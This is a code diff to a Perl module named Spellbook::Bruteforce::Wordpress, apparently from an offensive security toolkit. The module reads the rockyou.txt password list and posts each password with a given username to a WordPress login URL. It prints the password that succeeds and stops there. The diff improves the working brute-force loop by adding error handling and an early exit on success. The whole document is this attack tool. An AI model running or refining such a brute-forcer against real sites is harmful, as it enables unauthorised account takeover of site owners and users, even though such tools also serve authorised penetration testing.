@@ -3,6 +3,7 @@ package Spellbook::Bruteforce::Wordpress {
     use warnings;
     use LWP::UserAgent;
     use HTTP::Request::Common;
+    use Carp qw(croak);
 
     # THIS IS A DRAFT MODULE
 
@@ -18,28 +19,32 @@ package Spellbook::Bruteforce::Wordpress {
         );
 
         if ($target) {
-            open(my $wordlist, "<", "./files/rockyou.txt");
+            open(my $wordlist, "<", "./files/rockyou.txt")
+                or croak "Could not open wordlist file: $!";
+            my @passwords = <$wordlist>;
+            close($wordlist) or croak "Could not close wordlist file: $!";
 
-            while (<$wordlist>) {
-                chomp ($_);
+            chomp(@passwords);
 
+            foreach my $password (@passwords) {
                 my $useragent = LWP::UserAgent->new;
 
                 my $response = $useragent -> request(POST $target, [
                     log => $username,
-                    pwd => $_,
+                    pwd => $password,
                 ]);
 
                 if ($response -> is_success) {
-                    print "Successfully logged in with password: $_ \n";
+                    print "Successfully logged in with password: $password \n";
+                    last;
                 }
             }
-
-            close($wordlist);
         }
 
         if ($help) {
-            return "";
+            return<<"EOT";
+
+EOT
         }
 
         return 0;
